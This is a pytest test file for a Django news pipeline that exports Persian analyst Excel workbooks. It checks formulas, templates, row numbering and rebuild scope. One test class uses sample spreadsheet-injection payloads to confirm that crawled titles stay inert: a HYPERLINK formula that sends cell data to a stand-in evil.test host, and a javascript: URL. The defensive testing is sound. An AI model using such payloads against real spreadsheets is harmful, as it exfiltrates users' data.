"""The analyst workbook.

The tests that matter here are the ones about the template's own quirks. A workbook with
the wrong dropdown values or a missing extLst block still OPENS - which is precisely why
those failures went unnoticed in the legacy exporter for 40 files.
"""

from __future__ import annotations

import itertools
import zipfile
from datetime import timedelta
from zoneinfo import ZoneInfo

import pytest
from django.conf import settings
from django.utils import timezone
from openpyxl import load_workbook

from articles.models import Article
from core.scoring import HIGH_COUNT_REQUIRED, decide
from core.text import jalali_str, to_jalali
from core.vocabulary import GOLD_TRENDS, LEVELS, NotifyStatus
from exports import workbook
from inference.models import Classification, Evaluation, Summary

pytestmark = pytest.mark.django_db


# ------------------------------------------------------------- a tiny formula evaluator
#
# `_formula` generates exactly three constructs - IF, AND and COUNTIF over one row - so
# this evaluates OUR grammar rather than pretending to be Excel. It exists because the
# module claims the workbook "cannot drift into voting differently from decide()", and the
# only test that can hold that claim up is one that runs both and compares the answers.


def _split_args(text: str) -> list[str]:
    args, depth, quoted, current = [], 0, False, ""
    for character in text:
        if character == '"':
            quoted = not quoted
        elif not quoted and character == "(":
            depth += 1
        elif not quoted and character == ")":
            depth -= 1
        elif not quoted and character == "," and depth == 0:
            args.append(current)
            current = ""
            continue
        current += character
    return [*args, current]


def _evaluate(expression: str, cells: list[str]):
    """Loosest binding first: calls, then comparison, then addition, then a bare COUNTIF.

    The order is the whole subtlety. A sum of COUNTIFs also starts with `COUNTIF(` and ends
    with `)`, so a naive check reads the entire sum as one call; and a comparison has to be
    split before addition or `a+b>=2` partitions into `a` and `b>=2`.
    """
    expression = expression.strip()
    if expression.startswith('"') and expression.endswith('"'):
        return expression[1:-1]
    if expression.isdigit():
        return int(expression)
    if expression.startswith("IF(") and expression.endswith(")"):
        condition, yes, no = _split_args(expression[3:-1])
        return _evaluate(yes if _evaluate(condition, cells) else no, cells)
    if expression.startswith("AND(") and expression.endswith(")"):
        return all(_evaluate(part, cells) for part in _split_args(expression[4:-1]))
    # `>=` before `=`, or the `=` inside `>=` matches first. Every comparison left at this
    # point is top level: IF and AND are already unwrapped, and no COUNTIF argument
    # contains one of these characters.
    for symbol, compare in ((">=", lambda a, b: a >= b), ("<", lambda a, b: a < b),
                            ("=", lambda a, b: a == b)):
        left, separator, right = expression.partition(symbol)
        if separator:
            return compare(_evaluate(left, cells), _evaluate(right, cells))
    if "+" in expression:
        return sum(_evaluate(part, cells) for part in expression.split("+"))
    _, literal = _split_args(expression[len("COUNTIF(") : -1])
    return cells.count(literal.strip().strip('"'))


def notify_by_formula(scores) -> str:
    """What Excel would show in the notify column for one row of scores."""
    return _evaluate(workbook._formula(3).lstrip("="), [score or "" for score in scores])


@pytest.fixture
def analysed(make_article, variant):
    """An article with a full set of inference rows, as the workbook expects."""

    def _make(category="security", **scores):
        article = make_article(published_at=timezone.now())
        Classification.objects.create(
            article=article, variant=variant, prompt_version=variant.prompt_version,
            provider="gapgpt", model="m", category=category, confidence="زیاد",
        )
        Evaluation.objects.create(
            article=article, variant=variant, prompt_version=variant.prompt_version,
            provider="gapgpt", model="m",
            confidence_occurrence=scores.get("confidence_occurrence", "زیاد"),
            gold_price_impact=scores.get("gold_price_impact"),
            security_relevance=scores.get("security_relevance", "زیاد"),
            gold_trend=scores.get("gold_trend", "↑"),
        )
        Summary.objects.create(
            article=article, variant=variant, prompt_version=variant.prompt_version,
            provider="gapgpt", model="m",
            optimized_title="تیتر بهینه‌شده", one_line="خلاصه یک‌خطی",
        )
        return article

    return _make


class TestRows:
    def test_uses_the_optimised_title_when_available(self, analysed):
        analysed()
        assert workbook.rows()[0]["تیتر خبر"] == "تیتر بهینه‌شده"

    def test_falls_back_to_the_original_title(self, make_article):
        article = make_article(published_at=timezone.now())
        assert workbook.rows()[0]["تیتر خبر"] == article.original_title

    def test_an_unassessed_axis_is_blank_not_a_level(self, analysed):
        """The workbook has to show 'nobody judged this', and a blank cell is how the
        team's file expresses it. Writing a level would be the sentinel bug in Excel."""
        analysed(gold_price_impact=None)
        record = workbook.rows()[0]
        assert record["چقدر بر تغییر قیمت طلا اثر دارد؟"] == ""

    def test_notify_status_matches_the_scoring_rule(self, analysed):
        analysed(confidence_occurrence="زیاد", security_relevance="زیاد")
        assert workbook.rows()[0][workbook.NOTIFY_HEADER] == NotifyStatus.NOTIFY

    def test_duplicates_are_excluded(self, analysed, make_article):
        canonical = analysed()
        duplicate = make_article(published_at=timezone.now())
        duplicate.duplicate_of = canonical
        duplicate.save()
        assert len(workbook.rows()) == 1

    def test_persian_dates_use_the_teams_format(self):
        assert workbook.persian_date("1405-06-11") == "11 شهریور 1405"

    def test_filename_matches_the_teams_convention(self):
        """An ISO date would land the same content under names nobody recognises."""
        assert workbook.workbook_filename("1405-06-11") == "ثبت و تحلیل خبر - 11 شهریور 1405.xlsx"


class TestFormula:
    def test_formula_is_generated_from_the_scoring_thresholds(self):
        """The workbook must not be able to vote differently from decide(). Both read the
        same constants, so a retune moves them together."""
        formula = workbook._formula(3)
        assert f">={HIGH_COUNT_REQUIRED}" in formula
        assert NotifyStatus.NOTIFY in formula and NotifyStatus.NO_NOTIFY in formula
        # The two strongest levels count as "high"; the weakest is the floor violation.
        assert LEVELS[3] in formula and LEVELS[4] in formula
        assert LEVELS[0] in formula

    def test_the_formula_agrees_with_decide_on_every_combination(self):
        """The claim the module makes, held up rather than asserted.

        The formula could only say notify or do-not-notify, so a row where the model
        assessed fewer than two axes - every score cell blank - evaluated to «اطلاع‌رسانی
        نشود» while `decide()` returned «ارزیابی ناکافی». The two artifacts built by the
        same function disagreed, and the one the analyst reads was the one that collapsed
        "not assessed" into "not notable" - the exact substitution this system exists to
        prevent.
        """
        for scores in itertools.product((None, *LEVELS), repeat=3):
            assert notify_by_formula(scores) == decide(*scores).status, scores

    def test_an_unassessed_row_reads_as_insufficient_not_as_quiet(self):
        assert notify_by_formula((None, None, None)) == NotifyStatus.INSUFFICIENT
        assert notify_by_formula((LEVELS[4], None, None)) == NotifyStatus.INSUFFICIENT


class TestBuiltFile:
    @pytest.fixture
    def built(self, analysed, tmp_path):
        analysed()
        return workbook.build_workbook(workbook.rows(), tmp_path / "out.xlsx")

    def test_only_the_analyst_sheet_survives(self, built):
        """The template has four sheets; all 40 workbooks the team produced carry one."""
        assert load_workbook(built).sheetnames == [workbook.SHEET]

    def test_the_link_column_header_is_restored(self, built):
        """The template's own header row is missing this cell, so every legacy workbook
        had an unlabelled final column."""
        sheet = load_workbook(built)[workbook.SHEET]
        assert sheet.cell(2, len(workbook.HEADERS)).value == "لینک"

    def test_extension_block_survives_the_save(self, built):
        """openpyxl drops <extLst> silently. Without it the file still OPENS - with the
        analyst's conditional formatting and validation extensions gone."""
        with zipfile.ZipFile(built) as archive:
            xml = archive.read("xl/worksheets/sheet1.xml")
        assert b"<extLst" in xml and b"</extLst>" in xml

    def test_dropdowns_offer_the_pipelines_own_vocabulary(self, built):
        """The template ships two stale validations: a yes/no list on the score columns
        from row 304 down, and a gold-trend list that stops at row 303."""
        sheet = load_workbook(built)[workbook.SHEET]
        formulas = [v.formula1 for v in sheet.data_validations.dataValidation]
        assert any(all(level in f for level in LEVELS) for f in formulas)
        assert any(all(trend in f for trend in GOLD_TRENDS) for f in formulas)

    def test_dropdowns_cover_the_whole_styled_range(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        spans = " ".join(str(v.sqref) for v in sheet.data_validations.dataValidation)
        assert str(workbook.MAX_STYLED_ROW) in spans

    def test_notify_cell_holds_a_formula_not_a_value(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        column = workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
        assert str(sheet.cell(workbook.FIRST_DATA_ROW, column).value).startswith("=IF(")

    def test_the_link_is_a_real_hyperlink(self, built):
        sheet = load_workbook(built)[workbook.SHEET]
        cell = sheet.cell(workbook.FIRST_DATA_ROW, len(workbook.HEADERS))
        assert cell.hyperlink is not None


class TestExportAll:
    def test_other_articles_stay_out_of_the_workbook(self, analysed, tmp_path):
        """`other` articles are stored and visible in the app, but the workbook is a
        security/economics instrument and the team's files never carried them."""
        analysed(category="other")
        files = workbook.export_all(tmp_path)
        assert not [key for key in files if key.startswith("excel:")]

    def test_one_workbook_per_jalali_day(self, analysed, tmp_path):
        analysed()
        analysed()
        files = workbook.export_all(tmp_path)
        assert len([key for key in files if key.startswith("excel:")]) == 1

    def test_writes_the_notify_feed_and_a_file_per_category(self, analysed, tmp_path):
        analysed()
        files = workbook.export_all(tmp_path)
        assert files["important"].exists()
        assert files["text:security"].exists()
        assert files["text:security/economics"].exists()

    def test_notify_feed_contains_only_notifying_articles(self, analysed, tmp_path):
        analysed(confidence_occurrence="کم", security_relevance="کم")
        files = workbook.export_all(tmp_path)
        assert files["important"].read_text(encoding="utf-8").strip() == ""


class TestRowNumbering:
    """`شناسه خبر` is a position within the file, not a corpus-wide sequence.

    Checked against the team's own output, not inferred: all 40 workbooks under
    `LEGACY/NEWS_AI_PROJECT/*/Excel Files/` number their rows 1..N from 1, with zero
    exceptions. The exporter enumerated the WHOLE canonical corpus and then grouped the
    already-numbered records by day, so the second day of a deployment opened with
    «شناسه خبر» starting at 51. Nothing in the pipeline notices - the file still opens, and
    the only reader who sees it is the analyst.
    """

    def test_each_workbook_numbers_its_own_rows_from_one(self, analysed, tmp_path):
        yesterday = timezone.now() - timedelta(days=1)
        for _ in range(2):
            analysed()
        older = analysed()
        Article.objects.filter(pk=older.pk).update(
            published_at=yesterday,
            published_at_jalali=jalali_str(
                to_jalali(yesterday.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
            ),
        )

        files = workbook.export_all(tmp_path)
        paths = [path for key, path in files.items() if key.startswith("excel:")]
        assert len(paths) == 2, "the fixture must produce two distinct Jalali days"

        for path in paths:
            sheet = load_workbook(path)[workbook.SHEET]
            ids = [
                sheet.cell(row, 1).value
                for row in range(workbook.FIRST_DATA_ROW, sheet.max_row + 1)
            ]
            ids = [value for value in ids if value not in (None, "")]
            assert ids == list(range(1, len(ids) + 1)), (
                f"{path.name} is numbered {ids}, not 1..N"
            )

    def test_numbering_is_a_property_of_the_file_not_of_the_records(self, analysed, tmp_path):
        """Handing `build_workbook` an arbitrary slice still yields 1..N, so no future way
        of selecting records can reintroduce a global sequence."""
        for _ in range(3):
            analysed()
        target = workbook.build_workbook(workbook.rows()[1:], tmp_path / "slice.xlsx")

        sheet = load_workbook(target)[workbook.SHEET]
        assert sheet.cell(workbook.FIRST_DATA_ROW, 1).value == 1


class TestRebuildIsBounded:
    """The nightly task rebuilt one workbook per Jalali day in the whole corpus, forever.

    Each is a template copy, an openpyxl parse, a save and a zip rewrite, so the cost grew
    without limit for the life of the deployment while almost every file was rewritten
    byte-for-byte. Nothing about the output would ever show it - only the clock.
    """

    def _age(self, article, days):
        moment = timezone.now() - timedelta(days=days)
        Article.objects.filter(pk=article.pk).update(
            published_at=moment,
            fetched_at=moment,
            published_at_jalali=jalali_str(
                to_jalali(moment.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
            ),
        )

    def test_a_day_nobody_touched_is_not_rebuilt(self, analysed, tmp_path, settings):
        settings.NEWS_ROLLING_WINDOW_DAYS = 14
        settings.EXPORT_DIR = tmp_path
        self._age(analysed(), 90)
        analysed()

        from exports.tasks import build_daily_workbook

        result = build_daily_workbook()
        assert result["workbooks"] == 1, "only the recent day should have been rebuilt"

    def test_a_backfilled_old_article_does_bring_its_day_back(self, analysed, tmp_path, settings):
        """The window is on FETCH time, not publication time. A backfill run pulls in
        months-old articles today, and their workbook is an old day's file that genuinely
        does need rewriting - keying this on publication would silently skip it."""
        settings.NEWS_ROLLING_WINDOW_DAYS = 14
        settings.EXPORT_DIR = tmp_path
        old = analysed()
        moment = timezone.now() - timedelta(days=90)
        Article.objects.filter(pk=old.pk).update(
            published_at=moment,
            fetched_at=timezone.now(),  # fetched today, published in the spring
            published_at_jalali=jalali_str(
                to_jalali(moment.astimezone(ZoneInfo(settings.TEHRAN_TZ)))
            ),
        )

        from exports.tasks import build_daily_workbook

        assert build_daily_workbook()["workbooks"] == 1

    def test_rebuild_all_is_the_escape_for_a_fresh_deployment(self, analysed, tmp_path, settings):
        settings.NEWS_ROLLING_WINDOW_DAYS = 14
        settings.EXPORT_DIR = tmp_path
        self._age(analysed(), 90)
        analysed()

        from exports.tasks import build_daily_workbook

        assert build_daily_workbook(rebuild_all=True)["workbooks"] == 2

    def test_the_text_feeds_still_cover_the_whole_corpus(self, analysed, tmp_path, settings):
        """One file each, not one per day, so bounding them would just lose data."""
        settings.NEWS_ROLLING_WINDOW_DAYS = 14
        settings.EXPORT_DIR = tmp_path
        self._age(analysed(), 90)

        from exports.tasks import build_daily_workbook

        build_daily_workbook()
        feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
        assert "تیتر بهینه‌شده" in feed


class TestSpreadsheetInjection:
    """A crawled headline must not become a live formula.

    openpyxl types any string starting with `=` as a FORMULA, so the payload is inert
    everywhere in this system except in the one artifact a human opens. Titles, leads and
    outlet names come verbatim from third-party markup.
    """

    def _sheet(self, article, tmp_path, name):
        target = workbook.build_workbook(workbook.rows(), tmp_path / name)
        return load_workbook(target)[workbook.SHEET]

    def test_a_headline_that_looks_like_a_formula_is_stored_as_text(
        self, analysed, tmp_path
    ):
        payload = '=HYPERLINK("http://evil.test/?x="&A2,"مشاهده خبر")'
        article = analysed()
        Article.objects.filter(pk=article.pk).update(original_title=payload)
        Summary.objects.filter(article=article).delete()

        sheet = self._sheet(article, tmp_path, "title.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("تیتر خبر") + 1)
        assert cell.data_type == "s", "a crawled title must never be typed as a formula"
        assert cell.value == payload, "and the text itself must survive unchanged"

    def test_an_outlet_name_is_stored_as_text_too(self, analysed, tmp_path):
        """Every value column, not just the title - the outlet is equally third-party."""
        article = analysed()
        Article.objects.filter(pk=article.pk).update(original_outlet="=1+1")

        sheet = self._sheet(article, tmp_path, "outlet.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("منبع") + 1)
        assert cell.data_type == "s"

    def test_the_notify_column_is_still_a_real_formula(self, analysed, tmp_path):
        """The guard must not disarm the one formula that is supposed to be there - it is
        what keeps the sheet from voting differently from `decide()`."""
        analysed()
        sheet = self._sheet(None, tmp_path, "notify.xlsx")
        cell = sheet.cell(
            workbook.FIRST_DATA_ROW, workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
        )
        assert cell.data_type == "f"

    def test_a_non_http_url_is_not_turned_into_a_clickable_link(self, analysed, tmp_path):
        """`urljoin` resolves `javascript:...` to itself, and `quality_reason` records
        `invalid_url` as a flag without stopping the row reaching the workbook."""
        article = analysed()
        Article.objects.filter(pk=article.pk).update(url="javascript:alert(1)")

        sheet = self._sheet(article, tmp_path, "link.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
        assert cell.hyperlink is None
        assert cell.value == "javascript:alert(1)", "still shown, just not clickable"

    def test_an_ordinary_link_is_still_a_hyperlink(self, analysed, tmp_path):
        analysed()
        sheet = self._sheet(None, tmp_path, "ok-link.xlsx")
        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
        assert cell.hyperlink is not None


class TestIdColumnIsNumeric:
    def test_the_id_is_a_number_not_a_string(self, analysed, tmp_path):
        """All 40 of the team's workbooks store an integer in «شناسه خبر». A numeric-looking
        string renders left-aligned as text and does not sort as a number."""
        analysed()
        target = workbook.build_workbook(workbook.rows(), tmp_path / "id.xlsx")
        cell = load_workbook(target)[workbook.SHEET].cell(workbook.FIRST_DATA_ROW, 1)
        assert cell.value == 1
        assert isinstance(cell.value, int)
